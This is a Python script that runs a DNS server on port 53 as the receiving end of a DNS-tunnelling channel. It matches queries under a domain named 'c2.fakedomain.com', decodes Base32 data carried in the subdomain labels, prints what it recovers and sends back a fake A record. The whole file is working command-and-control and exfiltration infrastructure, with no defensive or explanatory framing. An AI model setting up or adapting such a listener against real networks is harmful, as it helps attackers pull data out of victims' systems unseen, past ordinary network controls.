import socket
import re
import base64
from dnslib import DNSRecord, RR, QTYPE, A

# IP and Port to listen on
UDP_IP = "0.0.0.0"
UDP_PORT = 53

# Domain to match against
DOMAIN = "c2.fakedomain.com"

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((UDP_IP, UDP_PORT))

print(f"Listening for DNS requests on {UDP_IP}:{UDP_PORT}...")

# Set to keep track of processed queries
processed_queries = set()

# Function to add padding to the Base32 string
def pad_base32(encoded_str):
    missing_padding = len(encoded_str) % 8
    if missing_padding:
        encoded_str += '=' * (8 - missing_padding)
    return encoded_str

# Function to create a fake DNS response
def create_fake_response(request, addr):
    # Parse the incoming DNS request
    dns_request = DNSRecord.parse(request)

    # Get the queried domain name
    qname = dns_request.q.qname

    # Create a DNS response with the same ID as the request
    dns_response = DNSRecord(q=dns_request.q)

    # Set the response header (qr=1 means it's a response)
    dns_response.header.id = dns_request.header.id  # Copy the request ID
    dns_response.header.qr = 1  # This is a response
    dns_response.header.aa = 1  # Authoritative answer
    dns_response.header.ra = 1  # Recursion available
    dns_response.header.rd = dns_request.header.rd  # Copy the recursion desired flag

    # Add an answer (A record) with a fake IP address (e.g., 123.123.123.123)
    fake_ip = "123.123.123.123"
    dns_response.add_answer(RR(qname, QTYPE.A, rdata=A(fake_ip), ttl=300))

    # Send the DNS response back to the client
    sock.sendto(dns_response.pack(), addr)

# Listen for incoming DNS requests
while True:
    # Receive data from the socket
    byteData, addr = sock.recvfrom(2048)  # buffer size is 2048 bytes
    try:
        # Parse the DNS message
        msg = DNSRecord.parse(byteData)

        # Extract the queried domain name
        domain_name = str(msg.q.qname)

        # Check if the query has already been processed
        if domain_name in processed_queries:
            continue

        # Add the domain name to the processed queries set
        processed_queries.add(domain_name)

        # Regex search for the specific Base32 encoded string pattern in the DNS message
        # Uses the DOMAIN variable for flexibility
        m = re.search(r'([A-Z2-7]+)\.' + re.escape(DOMAIN), domain_name)

        # If a match is found, decode the Base32 encoded string
        if m:
            encoded_string = m.group(1)
            try:
                # Add padding to the Base32 string
                padded_encoded_string = pad_base32(encoded_string)
                
                # Decode the Base32 string
                decoded_bytes = base64.b32decode(padded_encoded_string)
                decoded_string = decoded_bytes.decode('utf-8')

                print(f"Got Base32 encoded data from {addr}: {encoded_string}")
                print(f"Decoded name: {decoded_string}")
            except Exception as e:
                print(f"Failed to decode Base32 string: {encoded_string}. Error: {e}")

        # Send a fake DNS response back to the client
        create_fake_response(byteData, addr)

    except Exception as e:
        # Print any errors during message processing
        print(f"Error: {e}")
        continue
